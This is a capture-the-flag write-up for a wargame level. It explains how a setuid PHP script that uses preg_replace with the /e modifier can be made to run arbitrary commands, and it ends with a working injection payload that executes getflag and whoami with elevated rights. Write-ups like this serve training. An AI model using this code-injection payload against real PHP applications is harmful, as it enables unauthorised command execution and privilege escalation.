# level06

```bash
ls -l
# -rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
# -rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
We understand that `level06` has the `flag06` rights and launches `level06.php`

```php
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}

function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

```
The program takes 2 arguments,
  - The first one is a path to a file which will be read
  - The second one isn't used
If the content of the file matches a certain regex, the expression will be
evaluated (`/e`), calling the function y but we don't care about the rest.
We just have to give a file with getflag as the second group of the regex
The second group is inserted in a string, we have to find out how to run a cmd
```

> php call function in string
[In PHP, How to call a function interpolated in string?](https://stackoverflow.com/questions/10002652/in-php-how-to-call-a-function-interpolated-in-string)
=> We can run php code inside string with `{}`

Write into `/tmp/a` and then `./level06 /tmp/a a`:
```
[x {${exec(whoami)}}]
[x {${exec(getflag)}}]
```
